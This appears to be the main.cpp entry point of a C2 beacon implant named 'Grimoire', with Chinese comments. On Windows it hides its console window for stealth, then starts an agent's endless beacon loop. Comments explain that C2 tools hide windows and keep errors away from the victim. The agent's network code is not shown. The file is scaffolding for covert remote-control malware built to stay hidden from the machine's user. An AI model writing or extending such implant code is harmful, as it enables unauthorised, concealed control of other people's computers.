//
// Created by Nebu1ea on 2025/11/25.
//
// beacon/main.cpp

#include <iostream>
#include <stdexcept>
#include <cstdlib> // 用于 EXIT_SUCCESS / EXIT_FAILURE

// 引入核心的 Agent 类
#include "GrimoireAgent.hpp"

using Grimoire::Agent::GrimoireAgent;

/**
 * @brief Beacon 的主程序入口。
 */
int main(int argc, char* argv[]) {

    // 隐藏控制台窗口 (Windows 特有，用于隐匿性)
#ifdef _WIN32
    // Windows API 调用，用于获取和隐藏控制台窗口句柄
    // FreeConsole() 也可以用于释放控制台
    // 实际 C2 中，还会使用 CreateProcess 等方法启动时就避免显示窗口
    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        ShowWindow(hWnd, SW_HIDE);
    }
#endif

    try {
        // 创建 GrimoireAgent 实例
        std::cout << "INFO: Initializing Grimoire Agent..." << std::endl;
        GrimoireAgent agent;

        // 启动 Beacon 主循环
        std::cout << "INFO: Starting Beacon main loop..." << std::endl;
        agent.Run();

    } catch (const std::runtime_error& e) {
        // 捕获运行时关键错误（如 cURL 失败，内存分配失败）
        // 在 C2 中，通常只记录错误并退出，不会向用户显示
        std::cerr << "FATAL RUNTIME ERROR: " << e.what() << std::endl;
        return EXIT_FAILURE;

    } catch (const std::exception& e) {
        std::cerr << "FATAL UNKNOWN ERROR: " << e.what() << std::endl;
        return EXIT_FAILURE;

    } catch (...) {
        std::cerr << "FATAL: An unhandled exception occurred." << std::endl;
        return EXIT_FAILURE;
    }

    // 理论上 Run() 是一个无限循环，代码不会执行到这里
    return EXIT_SUCCESS;
}